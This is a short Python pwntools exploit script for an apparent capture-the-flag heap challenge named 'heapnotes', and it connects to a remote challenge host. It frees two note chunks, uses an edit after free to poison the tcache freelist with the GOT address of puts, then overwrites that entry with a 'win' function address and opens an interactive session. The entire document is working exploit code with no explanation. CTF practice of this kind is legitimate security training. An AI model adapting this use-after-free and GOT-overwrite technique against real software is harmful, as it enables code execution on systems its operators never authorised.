from pwn import * 
e = ELF('./heapnotes')
context.log_level = 'debug'
#r = process('./heapnotes_patched')
r = remote('chal.nbctf.com', 30172)
def add(d):
    r.recvuntil(b'>')
    r.sendline(b'1')
    r.recvuntil(b':')
    r.sendline(d)
def delt(i):
    r.recvuntil(b'>')
    r.sendline(b'4')
    r.recvuntil(str(i).encode())
    r.sendline(str(i).encode())
def upd(i, d):
    r.recvuntil(b'>')
    r.sendline(b'3')
    r.recvuntil(b':')
    r.sendline(str(i).encode())
    r.recvuntil(b':')
    r.sendline(d)
add(b'a'*0x8)
add(b'b'*0x8)
delt(0)
delt(1)
upd(1, p64(e.got['puts']))
add(b'a'*0x8)
add(p64(e.sym['win']))
r.interactive()

